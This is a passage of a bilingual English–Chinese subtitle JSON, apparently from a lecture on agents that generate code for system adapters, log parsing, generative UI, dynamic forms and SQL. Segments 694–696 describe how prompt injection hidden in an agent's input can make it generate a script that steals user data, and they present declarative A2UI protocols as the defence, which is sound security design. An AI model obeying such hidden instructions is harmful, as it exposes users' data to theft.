    "en": "Control group: generate a potted plant, and the merits of the two routes are exactly reversed—on the code route, even with procedural noise added, the result is stiff and lifeless; on the generative-model route, it is natural and vivid.",
    "zh": "对照组：生成一个盆栽植物，两种路径的优势恰好相反——在代码路径中，即使添加了过程噪声，结果也僵硬而无生气；而在生成模型路径中，结果自然且生动。"
  },
  {
    "id": 638,
    "start": 6045.862,
    "end": 6048.362,
    "en": "Code as a System Adapter.",
    "zh": "代码作为系统适配器。"
  },
  {
    "id": 639,
    "start": 6048.362,
    "end": 6056.225,
    "en": "The code in the previous sections mostly produces \"human-facing\" things — reports, slides, interfaces.",
    "zh": "前几节中的代码主要生成的是“面向人类”的内容——报告、幻灯片、界面。"
  },
  {
    "id": 640,
    "start": 6056.225,
    "end": 6061.3,
    "en": "The code in this section points in another direction: connecting machine to machine.",
    "zh": "本节中的代码则指向另一个方向：实现机器与机器之间的连接。"
  },
  {
    "id": 641,
    "start": 6061.3,
    "end": 6076.45,
    "en": "In real systems, the external services an Agent must talk to often have no ready-made SDK, and their interfaces are rarely tidy — documentation may be missing, response formats may be nonstandard, and fields may drift across versions.",
    "zh": "在真实系统中，智能体需要调用的外部服务通常没有现成的SDK，其接口也极少整洁——文档可能缺失，响应格式可能不标准，字段可能在不同版本间发生变化。"
  },
  {
    "id": 642,
    "start": 6076.45,
    "end": 6079.937,
    "en": "The Agent need not wait for a prebuilt adapter.",
    "zh": "智能体无需等待预建的适配器。"
  },
  {
    "id": 643,
    "start": 6079.937,
    "end": 6097.912,
    "en": "It can read the API documentation or inspect a few real responses, then generate the adapter on demand: construct an HTTP client, assemble authentication headers, parse the nonstandard response structure, and translate the upstream data model into a shape the downstream can consume.",
    "zh": "它可以阅读API文档或检查几个实际响应，然后按需生成适配器：构建HTTP客户端，组装认证头，解析非标准响应结构，并将上游数据模型转换为下游可以使用的格式。"
  },
  {
    "id": 644,
    "start": 6097.912,
    "end": 6107.15,
    "en": "Code here is \"universal glue\" for connecting arbitrary systems — wherever there is a gap, a piece of glue is generated on demand to fill it.",
    "zh": "这里的代码是连接任意系统的“通用粘合剂”——只要有缺口，就会按需生成一块粘合剂来填补它。"
  },
  {
    "id": 645,
    "start": 6107.15,
    "end": 6111.962,
    "en": "This is the heart of the meta-capability's \"system interface\" direction.",
    "zh": "这就是元能力‘系统接口’方向的核心。"
  },
  {
    "id": 646,
    "start": 6111.962,
    "end": 6124.912,
    "en": "The adaptive log parsing developed below is this capability made concrete in the observability setting: facing log formats that never stop evolving, the Agent likewise adapts by generating parsing code on the fly.",
    "zh": "下面开发的自适应日志解析功能，就是这种能力在可观测性场景中的具体实现：面对不断演化的日志格式，智能体同样通过实时生成解析代码来适应变化。"
  },
  {
    "id": 647,
    "start": 6125.068,
    "end": 6151.018,
    "en": "This \"universal glue\" can also extend to systems with no API at all: when an external system only exposes a graphical interface, the Agent can first operate the interface through Computer Use (detailed in Chapter 6), then turn the successful sequence of actions into a reusable RPA tool — the next time the same task comes up, it simply runs the code, fast and stable, with no expensive visual reasoning required.",
    "zh": "这种「通用粘合剂」也可以扩展到完全没有API的系统：当外部系统只提供图形界面时，智能体可以通过计算机使用（第6章详细说明）操作该界面，然后将成功的操作序列转化为可重复使用的RPA工具——下一次遇到相同任务时，它只需运行代码，快速且稳定，无需昂贵的视觉推理。"
  },
  {
    "id": 648,
    "start": 6151.018,
    "end": 6159.343,
    "en": "RPA, you might say, is the system adapter taken to its extreme: an adapter for systems with no programmatic interface.",
    "zh": "可以说，RPA是系统适配器的极致体现：一种针对无编程接口系统的适配器。"
  },
  {
    "id": 649,
    "start": 6159.343,
    "end": 6165.18,
    "en": "Chapter 9 develops this process of recording workflows and turning them into reusable code.",
    "zh": "第9章将详细介绍记录工作流程并将其转化为可重用代码的过程。"
  },
  {
    "id": 650,
    "start": 6165.18,
    "end": 6171.593,
    "en": "Data processing is among the most common — and most tiresome — tasks in software systems.",
    "zh": "数据处理是软件系统中最常见——也是最乏味的任务之一。"
  },
  {
    "id": 651,
    "start": 6171.593,
    "end": 6176.33,
    "en": "The root cause is that data formats are diverse and never stand still.",
    "zh": "根本原因在于数据格式多样且从不静止。"
  },
  {
    "id": 652,
    "start": 6176.33,
    "end": 6184.168,
    "en": "A single system may change its formats many times as it evolves — new fields, restructured nesting, new types.",
    "zh": "一个系统在演化过程中可能会多次更改其格式——新增字段、重新结构化嵌套内容、新增类型。"
  },
  {
    "id": 653,
    "start": 6184.168,
    "end": 6194.755,
    "en": "Hand-writing a parser for every format carries a punishing maintenance cost: each change means updating the parsing logic, testing compatibility, and shipping a new version.",
    "zh": "为每种格式手动编写解析器会带来巨大的维护成本：每次格式变更都需要更新解析逻辑、测试兼容性，并发布新版本。"
  },
  {
    "id": 654,
    "start": 6194.755,
    "end": 6208.593,
    "en": "Code generation offers a different approach entirely: when the Agent meets a new format, it generates parsing code on the fly from sample data, so the system tracks the evolution of formats automatically, with no human intervention.",
    "zh": "代码生成提供了一种完全不同的方法：当智能体遇到新格式时，它可以根据示例数据实时生成解析代码，这样系统就能自动跟踪格式的演变，而无需人工干预。"
  },
  {
    "id": 655,
    "start": 6208.593,
    "end": 6211.755,
    "en": "Agent Log Parsing and Visualization.",
    "zh": "智能体日志解析与可视化。"
  },
  {
    "id": 656,
    "start": 6211.755,
    "end": 6217.368,
    "en": "The observability of Agent systems depends on the visualization of execution flows.",
    "zh": "智能体系统的可观测性依赖于执行流程的可视化。"
  },
  {
    "id": 657,
    "start": 6217.368,
    "end": 6228.343,
    "en": "A complex Agent task may involve hundreds of steps, including multiple LLM calls, dozens of tool executions, and interactions between multiple sub-agents.",
    "zh": "一个复杂的智能体任务可能包含数百个步骤，包括多个大语言模型调用、数十次工具执行以及多个子智能体之间的交互。"
  },
  {
    "id": 658,
    "start": 6228.343,
    "end": 6243.88,
    "en": "Visualizing this data faces multiple challenges: different tools return data in different structures, and formats evolve with system iterations; a complete trajectory may contain hundreds of thousands of characters, requiring a balance between overview and detail.",
    "zh": "可视化这些数据面临多重挑战：不同工具返回的数据结构各异，格式随着系统迭代而变化；一条完整的轨迹可能包含数十万字符，需要在概览与细节之间取得平衡。"
  },
  {
    "id": 659,
    "start": 6243.88,
    "end": 6249.768,
    "en": "Code generation offers an elegant solution: establishing an auto-repair feedback loop.",
    "zh": "代码生成提供了一个优雅的解决方案：建立自动修复反馈循环。"
  },
  {
    "id": 660,
    "start": 6249.768,
    "end": 6261.293,
    "en": "When the frontend encounters an unparseable log format, instead of displaying an error, it automatically reports the failure information (raw log sample, detailed error) to the Agent.",
    "zh": "当前端遇到无法解析的日志格式时，不会显示错误，而是自动将失败信息（原始日志样本、详细错误）报告给智能体。"
  },
  {
    "id": 661,
    "start": 6261.293,
    "end": 6267.48,
    "en": "The Agent analyzes the sample data structure and generates frontend code that can correctly parse it.",
    "zh": "智能体分析样本数据结构并生成可以正确解析它的前端代码。"
  },
  {
    "id": 662,
    "start": 6267.48,
    "end": 6276.218,
    "en": "The code is first tested automatically in a virtual browser to verify parsing correctness, while a Vision LLM assesses the visualization.",
    "zh": "代码首先在虚拟浏览器中自动测试以验证解析的正确性，同时视觉大语言模型评估可视化效果。"
  },
  {
    "id": 663,
    "start": 6276.218,
    "end": 6281.293,
    "en": "If it passes both checks, it is deployed to the frontend as a hot update.",
    "zh": "如果通过了两项检查，它将作为热更新部署到前端。"
  },
  {
    "id": 664,
    "start": 6281.293,
    "end": 6287.755,
    "en": "Experiment 5-10 advanced difficulty, three stars: : Adaptive Log Parsing System",
    "zh": "实验5-10 高难度，三颗星：自适应日志解析系统"
  },
  {
    "id": 665,
    "start": 6287.755,
    "end": 6293.055,
    "en": "Experiment Goal: Build a self-evolving Agent log visualization system.",
    "zh": "实验目标：构建一个自我进化的智能体日志可视化系统。"
  },
  {
    "id": 666,
    "start": 6293.055,
    "end": 6298.118,
    "en": "Technical Approach: The initial system only supports basic formats.",
    "zh": "技术方法：初始系统仅支持基本格式。"
  },
  {
    "id": 667,
    "start": 6298.118,
    "end": 6305.655,
    "en": "Frontend detects parsing failure → Reports to Agent → Generates parsing code → Virtual browser testing → Hot update deployment.",
    "zh": "前端检测到解析失败→报告给智能体→生成解析代码→虚拟浏览器测试→热更新部署。"
  },
  {
    "id": 668,
    "start": 6305.655,
    "end": 6308.555,
    "en": "The entire process is automated.",
    "zh": "整个过程是自动化的。"
  },
  {
    "id": 669,
    "start": 6308.555,
    "end": 6319.268,
    "en": "Acceptance Criteria: Automatically detect failures and trigger learning, generate code that passes automated tests, correctly parse new formats after the hot update.",
    "zh": "验收标准：自动检测故障并触发学习，生成通过自动化测试的代码，在热更新后能正确解析新格式。"
  },
  {
    "id": 670,
    "start": 6319.268,
    "end": 6324.468,
    "en": "Automatic Analysis and Problem Diagnosis of Agent Execution Logs.",
    "zh": "智能体执行日志的自动分析与问题诊断。"
  },
  {
    "id": 671,
    "start": 6324.468,
    "end": 6331.68,
    "en": "Agents in production generate a large volume of trajectory logs (recording the complete process of each task).",
    "zh": "生产环境中的智能体生成大量轨迹日志（记录每个任务的完整过程）。"
  },
  {
    "id": 672,
    "start": 6331.68,
    "end": 6339.868,
    "en": "However, identifying problems, locating root causes, and constructing test cases from these logs is a high-cost endeavor.",
    "zh": "然而，从这些日志中识别问题、定位根本原因并构建测试用例是一项高成本的工作。"
  },
  {
    "id": 673,
    "start": 6339.868,
    "end": 6346.643,
    "en": "Failures may emerge from interactions among multiple modules, making root causes difficult to isolate.",
    "zh": "故障可能来自多个模块之间的交互，使得根本原因难以隔离。"
  },
  {
    "id": 674,
    "start": 6346.643,
    "end": 6353.555,
    "en": "They may also be expensive to reproduce because test environments rarely capture the full complexity of production.",
    "zh": "它们也可能难以复现，因为测试环境很少能捕捉生产环境的全部复杂性。"
  },
  {
    "id": 675,
    "start": 6353.555,
    "end": 6359.68,
    "en": "Finally, bugs often recur when fixes are not covered by systematic regression tests.",
    "zh": "最后，当修复未被系统性的回归测试覆盖时，错误往往会重复出现。"
  },
  {
    "id": 676,
    "start": 6359.836,
    "end": 6364.261,
    "en": "Code generation provides an automated path for diagnosis.",
    "zh": "代码生成为诊断提供了自动化的路径。"
  },
  {
    "id": 677,
    "start": 6364.211,
    "end": 6379.086,
    "en": "The Agent can read production logs, combine them with architecture documents and PRDs (Product Requirement Documents) to automatically determine whether the execution flow meets expectations, and pinpoint the problematic components and modules.",
    "zh": "智能体可以读取生产日志，将其与架构文档和PRD（产品需求文档）相结合，以自动判断执行流程是否符合预期，并定位问题组件和模块。"
  },
  {
    "id": 678,
    "start": 6379.086,
    "end": 6400.986,
    "en": "Based on the analysis results, it generates structured problem reports (priority, module, description, improvement suggestions) and regression test cases—the test cases reference the problem trajectory ID and key interaction rounds, and the test framework automatically replays them to verify that the fixed system produces correct behavior for the same input.",
    "zh": "基于分析结果，它会生成结构化的问题报告（优先级、模块、描述、改进建议）和回归测试用例——测试用例参考问题轨迹ID和关键交互回合，测试框架会自动重放它们，以验证修复后的系统对相同输入是否产生正确行为。"
  },
  {
    "id": 679,
    "start": 6400.986,
    "end": 6411.886,
    "en": "Finally, the Agent connects to GitHub via MCP to create an Issue and assign it to the relevant developer, completing the full automation from problem discovery to task assignment.",
    "zh": "最后，智能体通过MCP连接到GitHub，创建问题并分配给相关开发人员，从而完成从问题发现到任务分配的全流程自动化。"
  },
  {
    "id": 680,
    "start": 6411.886,
    "end": 6419.823,
    "en": "Experiment 5-11 advanced difficulty, three stars: : Intelligent Diagnostic System for Production Logs",
    "zh": "实验5-11 高级难度，三颗星：生产日志智能诊断系统"
  },
  {
    "id": 681,
    "start": 6419.823,
    "end": 6428.061,
    "en": "Experiment Goal: Automatically discover problems from production trajectories, generate test cases, and create work items.",
    "zh": "实验目标：从生产轨迹中自动发现故障，生成测试用例，并创建工作项。"
  },
  {
    "id": 682,
    "start": 6428.061,
    "end": 6438.898,
    "en": "Technical Approach: The Agent analyzes a set of production trajectories alongside system architecture documents and PRDs to identify problem patterns and the modules involved.",
    "zh": "技术方法：智能体分析一组生产轨迹以及系统架构文档和PRD，以识别问题模式及涉及的模块。"
  },
  {
    "id": 683,
    "start": 6438.898,
    "end": 6446.361,
    "en": "It then generates structured problem reports containing the priority, module, description, and recommended improvements.",
    "zh": "然后生成包含优先级、模块、描述和改进建议的结构化问题报告。"
  },
  {
    "id": 684,
    "start": 6446.361,
    "end": 6455.923,
    "en": "It also generates regression tests tied to trajectory IDs and interaction rounds; the test framework replays these cases and verifies the results.",
    "zh": "它还会生成与轨迹ID和交互回合相关的回归测试；测试框架会重放这些用例并验证结果。"
  },
  {
    "id": 685,
    "start": 6455.923,
    "end": 6460.223,
    "en": "Finally, the Agent creates GitHub issues through MCP.",
    "zh": "最后，智能体通过MCP创建GitHub问题。"
  },
  {
    "id": 686,
    "start": 6460.223,
    "end": 6466.523,
    "en": "As illustrated in Figure 5-7: Intelligent Production Log Diagnostic Pipeline.",
    "zh": "如图5-7所示：智能生产日志诊断流程。"
  },
  {
    "id": 687,
    "start": 6466.523,
    "end": 6468.998,
    "en": "Code as Generative UI.",
    "zh": "代码作为生成式用户界面。"
  },
  {
    "id": 688,
    "start": 6468.998,
    "end": 6474.298,
    "en": "Traditional Agent systems interact with users mainly through plain-text dialogue.",
    "zh": "传统智能体系统主要通过纯文本对话与用户互动。"
  },
  {
    "id": 689,
    "start": 6474.298,
    "end": 6480.123,
    "en": "But text is a linear, one-dimensional medium, and in many scenarios an inefficient one.",
    "zh": "但文本是一种线性的一维媒介，在许多场景下效率较低。"
  },
  {
    "id": 690,
    "start": 6480.123,
    "end": 6494.023,
    "en": "Collecting structured information requires a lengthy back-and-forth; complex data relationships are difficult to express in plain text; and when users must choose among options, a text list is far less intuitive than a visual interface.",
    "zh": "收集结构化信息需要反复来回；复杂的数据关系在纯文本中难以表达；当用户需要在多个选项中选择时，文本列表远不如可视化界面直观。"
  },
  {
    "id": 691,
    "start": 6494.023,
    "end": 6507.998,
    "en": "Code generation offers a way past these limitations: Agents can dynamically generate forms, interactive charts, and even complete web applications, turning static text dialogue into rich, multimodal interaction.",
    "zh": "代码生成提供了一种突破这些限制的方法：智能体可以动态生成表单、交互式图表，甚至完整的网页应用，将静态的文本对话转化为丰富的多模态交互。"
  },
  {
    "id": 692,
    "start": 6507.998,
    "end": 6514.111,
    "en": "This pattern, where the Agent dynamically generates the interface, is called Generative UI.",
    "zh": "这种智能体动态生成界面的模式被称为生成式用户界面（Generative UI）。"
  },
  {
    "id": 693,
    "start": 6514.111,
    "end": 6519.048,
    "en": "A2UI-like Protocols: Standardizing Generative UI.",
    "zh": "类似A2UI的协议：标准化生成式用户界面。"
  },
  {
    "id": 694,
    "start": 6519.22,
    "end": 6529.882,
    "en": "Allowing Agents to generate HTML and JavaScript that the client renders and executes directly creates a fundamental security risk: the generated code may be malicious.",
    "zh": "允许智能体生成HTML和JavaScript并由客户端直接渲染和执行，会带来根本性的安全风险：生成的代码可能是恶意的。"
  },
  {
    "id": 695,
    "start": 6529.832,
    "end": 6540.97,
    "en": "For example, if someone deliberately hides an instruction in the input, the Agent could be manipulated by prompt injection, unknowingly generating a script that stealthily steals user data.",
    "zh": "例如，如果有人故意在输入中隐藏一条指令，智能体可能被提示注入攻击所操控，无意中生成一个悄悄窃取用户数据的脚本。"
  },
  {
    "id": 696,
    "start": 6540.97,
    "end": 6559.382,
    "en": "Here the causal chain matters: prompt injection—malicious instructions mixed into the Agent's input—is the cause, while executing the resulting malicious script in the browser and stealing data resembles traditional Web XSS (Cross-Site Scripting); the attack as a whole should not simply be labeled XSS.",
    "zh": "这里的因果链很重要：提示注入——将恶意指令混入智能体的输入——是原因，而在浏览器中执行生成的恶意脚本并窃取数据则类似于传统的Web XSS（跨站脚本攻击）；整个攻击不应简单地被归类为XSS。"
  },
  {
    "id": 697,
    "start": 6559.382,
    "end": 6566.607,
    "en": "Declarative interface protocols such as A2UI (Agent-to-User Interface) offer a safer approach.",
    "zh": "声明式接口协议，如A2UI（智能体到用户界面），提供了一种更安全的方法。"
  },
  {
    "id": 698,
    "start": 6566.607,
    "end": 6578.645,
    "en": "Instead of generating executable code directly, the Agent outputs only a JSON \"UI description manifest,\" such as \"Display a table with three rows and two columns titled 'Sales Data.",
    "zh": "智能体不直接生成可执行代码，而是仅输出一个JSON格式的“用户界面描述清单”，例如“显示一个标题为‘销售数据’的三行两列表格”。"
  },
  {
    "id": 699,
    "start": 6578.645,
    "end": 6583.995,
    "en": "The client then renders the interface using its own predefined, safe components.",
    "zh": "然后客户端使用其自身预定义的安全组件来渲染界面。"
  },
  {
    "id": 700,
    "start": 6583.995,
    "end": 6596.07,
    "en": "This is like a restaurant menu: the customer (Agent) can order only dishes on the menu (predefined components), not enter the kitchen and prepare arbitrary dishes (execute arbitrary code).",
    "zh": "这就像一份餐厅菜单：顾客（智能体）只能点菜单上的菜品（预定义组件），而不能进入厨房准备任意菜肴（执行任意代码）。"
  },
  {
    "id": 701,
    "start": 6596.07,
    "end": 6602.882,
    "en": "One common point of confusion is AG-UI (Agent-User Interaction, proposed by CopilotKit).",
    "zh": "一个常见的混淆点是AG-UI（智能体-用户交互，由CopilotKit提出）。"
  },
  {
    "id": 702,
    "start": 6602.882,
    "end": 6619.632,
    "en": "Despite the similar name, it is not a UI description language but an event and transport protocol that streams the Agent's execution state—messages, tool calls, and state patches—to the frontend; it can also carry UI payloads such as A2UI manifests.",
    "zh": "尽管名称相似，但它不是用户界面描述语言，而是一个事件和传输协议，用于将智能体的执行状态（消息、工具调用和状态补丁）流式传输到前端；它也可以携带A2UI清单等用户界面负载。"
  },
  {
    "id": 703,
    "start": 6619.632,
    "end": 6625.745,
    "en": "The two are complementary and should not be grouped as examples of the same declarative-interface category.",
    "zh": "这两者是互补的，不应被归类为同一类声明式接口的示例。"
  },
  {
    "id": 704,
    "start": 6625.745,
    "end": 6643.595,
    "en": "The core design principle of such protocols is security-first: the client maintains a trusted component catalog (e.g., Card, Button, TextField, Table), and if the catalog and renderer are correctly enforced, the Agent may request only cataloged components and cannot inject arbitrary code.",
    "zh": "此类协议的核心设计原则是安全优先：客户端维护一个受信任的组件目录（例如，Card、Button、TextField、Table），如果目录和渲染器被正确实施，智能体只能请求目录中的组件，而无法注入任意代码。"
  },
  {
    "id": 705,
    "start": 6643.595,
    "end": 6651.22,
    "en": "The client renders using its own native components, not by executing arbitrary HTML generated by the Agent.",
    "zh": "客户端使用其自身的原生组件进行渲染，而不是执行由智能体生成的任意HTML。"
  },
  {
    "id": 706,
    "start": 6651.22,
    "end": 6665.132,
    "en": "These protocols typically also support cross-platform rendering (the same description renders in React, Flutter, and native apps) and incremental generation (for example, by streaming JSONL that the client renders as it arrives).",
    "zh": "这些协议通常也支持跨平台渲染（相同的描述可在React、Flutter和原生应用中渲染），以及增量生成（例如，通过流式传输JSONL，客户端在接收时即可渲染）"
  },
  {
    "id": 707,
    "start": 6665.132,
    "end": 6681.595,
    "en": "Of course, the declarative approach is suitable for standardized interaction scenarios (forms, tables, cards), while for highly customized needs (e.g., custom visualizations, game interfaces), direct code generation remains the more flexible choice.",
    "zh": "当然，声明式方法适用于标准化的交互场景（如表单、表格、卡片），而对于高度定制化的需求（例如，自定义可视化、游戏界面），直接生成代码仍然是更灵活的选择"
  },
  {
    "id": 708,
    "start": 6681.595,
    "end": 6685.445,
    "en": "Below are specific applications of both patterns.",
    "zh": "以下是这两种模式的具体应用"
  },
  {
    "id": 709,
    "start": 6685.445,
    "end": 6690.32,
    "en": "Delivering Results with HTML: Replacing Markdown Reports.",
    "zh": "通过HTML交付结果：替代Markdown报告"
  },
  {
    "id": 710,
    "start": 6690.32,
    "end": 6697.182,
    "en": "Generative UI is not only used during interaction but is also changing the form of the Agent's final deliverable.",
    "zh": "生成式UI不仅用于交互过程中，也在改变智能体最终交付成果的形式"
  },
  {
    "id": 711,
    "start": 6697.182,
    "end": 6706.257,
    "en": "Traditionally, an Agent finishes a task and hands over a Markdown report; but paging through linearly arranged Markdown is not a pleasant way to read.",
    "zh": "传统上，智能体完成任务后会交付一个Markdown报告；但逐页浏览线性排列的Markdown并不是一种愉快的阅读方式"
  },
  {
    "id": 712,
    "start": 6706.257,
    "end": 6713.857,
    "en": "As Agents get better at generating frontend code, practice is shifting toward having them produce HTML directly.",
    "zh": "随着智能体生成前端代码能力的提升，实践正在转向让它们直接生成HTML"
  },
  {
    "id": 713,
    "start": 6713.857,
    "end": 6719.395,
    "en": "Compared to Markdown, HTML deliverables have several distinct advantages.",
    "zh": "与Markdown相比，HTML交付物具有几个显著优势"
  },
  {
    "id": 714,
    "start": 6719.395,
    "end": 6730.157,
    "en": "First, interactive demonstrations let users see how the system works in an interactive form, often making it easier to understand at a glance than through lengthy textual descriptions.",
    "zh": "首先，交互式演示可以让用户以交互形式看到系统的工作方式，通常比通过冗长的文本描述更容易一目了然地理解"
  },
  {
    "id": 715,
    "start": 6730.157,
    "end": 6740.095,
    "en": "Second, better data visualization lets users explore data through charts and interactive controls for browsing, filtering, and drilling down into details.",
    "zh": "其次，更好的数据可视化让用户可以通过图表和交互控件探索数据，进行浏览、筛选和深入查看细节"
  },
  {
    "id": 716,
    "start": 6740.095,
    "end": 6750.945,
    "en": "Third, continuously improvable deliverables allow the Agent to update and extend an HTML website throughout the task instead of producing a static artifact only at the end.",
    "zh": "第三，持续改进的交付物允许智能体在整个任务过程中更新和扩展HTML网站，而不是仅在最后生成一个静态成果"
  },
  {
    "id": 717,
    "start": 6751.108,
    "end": 6759.945,
    "en": "Take the author's own experience writing research papers as an example: for each research project, the author maintains an interactive website.",
    "zh": "以作者撰写研究论文的经历为例：对于每个研究项目，作者都会维护一个交互式网站"
  },
  {
    "id": 718,
    "start": 6759.895,
    "end": 6769.545,
    "en": "It serves as both the final deliverable and a living document throughout the research process—the author has the Agent continuously update it as experiments progress.",
    "zh": "它既是最终交付物，也是研究过程中的活文档——作者让智能体随着实验的进展不断更新它"
  },
  {
    "id": 719,
    "start": 6769.545,
    "end": 6772.983,
    "en": "This website serves at least three purposes.",
    "zh": "这个网站至少有三个用途"
  },
  {
    "id": 720,
    "start": 6772.983,
    "end": 6795.458,
    "en": "First, experiment data traceability: the specific data for every experiment, the prompts used, and the LLM's raw responses can all be inspected item by item on the site; laying everything out in the open makes it easier to spot problems in data construction, format, and distribution, and to notice systematic biases in the LLM's responses or the judge's scoring.",
    "zh": "首先，实验数据可追溯性：每次实验的具体数据、使用的提示词以及大语言模型的原始响应都可以在网站上逐一检查；将所有内容公开展示有助于更容易地发现数据构建、格式和分布中的问题，并注意到大语言模型响应或评分者评分中的系统性偏差"
  },
  {
    "id": 721,
    "start": 6795.458,
    "end": 6806.758,
    "en": "Second, training metric monitoring: the site displays training curves directly, making it easy to monitor the model's internal health metrics and determine whether the training process remains healthy.",
    "zh": "第二，训练指标监控：该界面直接显示训练曲线，使监控模型的内部健康指标变得容易，并判断训练过程是否保持健康。"
  },
  {
    "id": 722,
    "start": 6806.758,
    "end": 6827.133,
    "en": "The term borrows from medicine: these are internal signals of whether the training process itself is healthy—training and validation loss, gradient norm, learning rate, the model's perplexity when emitting tokens (a measure of its \"confidence\" in its own output), and in reinforcement learning, reward, KL divergence, and policy entropy.",
    "zh": "这一术语借鉴了医学领域：这些是训练过程本身是否健康的内部信号——训练和验证损失、梯度范数、学习率，以及模型在生成标记时的困惑度（衡量其对自己输出的“信心”程度），在强化学习中还包括奖励、KL散度和策略熵。"
  },
  {
    "id": 723,
    "start": 6827.133,
    "end": 6843.97,
    "en": "They differ from final outcome metrics like task accuracy: just as physiological readings in a check-up stand apart from a person's outward performance, internal health metrics often surface problems—non-converging loss, exploding gradients, training collapse—much earlier.",
    "zh": "它们与最终结果指标（如任务准确率）不同：就像体检中的生理指标与一个人的外在表现不同，内部健康指标通常会更早地暴露问题——非收敛的损失、爆炸性梯度、训练崩溃等。"
  },
  {
    "id": 724,
    "start": 6843.97,
    "end": 6854.683,
    "en": "Third, demonstrating system operation: visualizations reveal how the entire system works, allowing readers to grasp the structure of the AI-built system at a glance.",
    "zh": "第三，展示系统运行：可视化效果揭示整个系统的运作方式，使读者能够一目了然地掌握AI构建的系统结构。"
  },
  {
    "id": 725,
    "start": 6854.683,
    "end": 6857.208,
    "en": "Clarifying User Intent.",
    "zh": "明确用户意图。"
  },
  {
    "id": 726,
    "start": 6857.208,
    "end": 6864.308,
    "en": "When requirements are vague or incomplete, the Agent must ask clarifying questions to gather the missing information.",
    "zh": "当需求模糊或不完整时，智能体必须提出澄清问题以收集缺失的信息。"
  },
  {
    "id": 727,
    "start": 6864.308,
    "end": 6888.683,
    "en": "Products like OpenAI Deep Research typically do this through text-based Q&A, but that approach has clear limits: it is inefficient because each question consumes a dialogue turn, so ten clarification points may require ten rounds; and it is poor at expressing dependencies among questions—for example, a travel destination constrains the available modes of transport—which plain text struggles to present clearly.",
    "zh": "像OpenAI Deep Research这样的产品通常通过基于文本的问答来实现，但这种方法有明显的局限性：它效率低下，因为每个问题都会消耗一次对话回合，因此十个澄清点可能需要十轮对话；并且它难以表达问题之间的依赖关系——例如，旅行目的地会限制可用的交通方式——而纯文本很难清晰地呈现这一点。"
  },
  {
    "id": 728,
    "start": 6888.683,
    "end": 6905.708,
    "en": "Through code generation, the Agent can create structured interactive interfaces to replace text-based Q&A. Figure 5-8 illustrates the dynamic form generation process, showing how the Agent transforms clarification questions into a structured interface that can be filled out in one go.",
    "zh": "通过代码生成，智能体可以创建结构化的交互界面来替代基于文本的问答。图5-8展示了动态表单生成过程，说明智能体如何将澄清问题转化为一个可一次性填写的结构化界面。"
  },
  {
    "id": 729,
    "start": 6905.708,
    "end": 6920.57,
    "en": "The Agent generates an HTML form containing various input controls—text boxes for open-ended information, dropdown menus for predefined options, checkboxes for multiple selections, and date pickers for simplified time input.",
    "zh": "智能体生成一个包含各种输入控件的HTML表单——用于开放式信息的文本框、用于预定义选项的下拉菜单、用于多选的复选框，以及用于简化时间输入的日期选择器。"
  },
  {
    "id": 730,
    "start": 6920.57,
    "end": 6930.758,
    "en": "More advanced versions can use JavaScript to create cascading forms that show or hide follow-up questions and update available options in response to the user's selections.",
    "zh": "更高级的版本可以使用JavaScript创建级联表单，根据用户的选项显示或隐藏后续问题，并更新可用选项。"
  },
  {
    "id": 731,
    "start": 6930.758,
    "end": 6941.67,
    "en": "The user fills out the entire form at once, eliminating multiple dialogue rounds, and can clearly see all required information and the logical relationships between questions.",
    "zh": "用户可以一次性填写整个表单，避免多次对话回合，并能清楚地看到所有所需信息以及问题之间的逻辑关系。"
  },
  {
    "id": 732,
    "start": 6941.67,
    "end": 6947.22,
    "en": "As illustrated in Figure 5-8: Dynamic Form Generation Process.",
    "zh": "如图5-8所示：动态表单生成过程。"
  },
  {
    "id": 733,
    "start": 6947.22,
    "end": 6955.108,
    "en": "Experiment 5-12 intermediate difficulty, two stars: : Intent Clarification System with Dynamic Forms",
    "zh": "实验5-12 中等难度，两颗星：使用动态表单的意图澄清系统"
  },
  {
    "id": 734,
    "start": 6955.108,
    "end": 6963.245,
    "en": "Experiment Goal: Verify the Agent's ability to clarify user intent by dynamically generating HTML forms.",
    "zh": "实验目标：验证智能体通过动态生成HTML表单来澄清用户意图的能力。"
  },
  {
    "id": 735,
    "start": 6963.245,
    "end": 6972.645,
    "en": "Technical Approach: The Agent analyzes the user's request, identifies clarification points, and generates form code with cascading logic.",
    "zh": "技术方法：智能体分析用户请求，识别澄清点，并生成具有级联逻辑的表单代码。"
  },
  {
    "id": 736,
    "start": 6972.645,
    "end": 6979.97,
    "en": "The frontend renders it, the user submits it once, and the Agent parses the JSON data to continue the task.",
    "zh": "前端将其渲染出来，用户提交一次，Agent 解析 JSON 数据以继续任务。"
  },
  {
    "id": 737,
    "start": 6979.97,
    "end": 6985.233,
    "en": "Acceptance Criteria: User inputs \"I want to book a flight to Beijing.",
    "zh": "接受标准：用户输入“我想预订飞往北京的航班。”"
  },
  {
    "id": 738,
    "start": 6985.233,
    "end": 6999.658,
    "en": "The Agent generates a form with the following fields: departure city (text input), departure date (date picker), trip type (radio buttons for one-way or round-trip), and return date (displayed only when round-trip is selected).",
    "zh": "Agent 生成一个包含以下字段的表单：出发城市（文本输入框）、出发日期（日期选择器）、行程类型（单程或往返的单选按钮），以及返回日期（仅在选择往返时显示）。"
  },
  {
    "id": 739,
    "start": 6999.658,
    "end": 7003.083,
    "en": "The user submits all information in one go.",
    "zh": "用户一次性提交所有信息。"
  },
  {
    "id": 740,
    "start": 7003.083,
    "end": 7005.645,
    "en": "Generating SQL Queries.",
    "zh": "生成 SQL 查询。"
  },
  {
    "id": 741,
    "start": 7005.796,
    "end": 7012.558,
    "en": "Database querying is a scenario where code generation can significantly enhance the interaction experience.",
    "zh": "数据库查询是代码生成可以显著提升交互体验的场景。"
  },
  {
    "id": 742,
    "start": 7012.508,
    "end": 7023.021,
    "en": "Traditional database access relies on GUI tools or handwritten SQL; the former is cumbersome to operate, and the latter requires the user to have specialized knowledge.",
    "zh": "传统的数据库访问依赖于 GUI 工具或手写 SQL；前者操作繁琐，后者要求用户具备专业知识。"
  },
  {
    "id": 743,
    "start": 7023.021,
    "end": 7037.908,
    "en": "An Agent can translate natural language into SQL, but there is a key design choice: should the Agent execute the query and describe the results in natural language, or should it generate the SQL as an artifact for the system to execute and the frontend to display?",
    "zh": "Agent 可以将自然语言翻译为 SQL，但有一个关键的设计选择：Agent 应该执行查询并用自然语言描述结果，还是将 SQL 作为独立可执行的产物生成，供系统执行和前端展示？"
  },
  {
    "id": 744,
    "start": 7037.908,
    "end": 7046.408,
    "en": "The first approach looks more \"intelligent\" but is grossly inefficient—a query against a large table may return thousands of rows.",
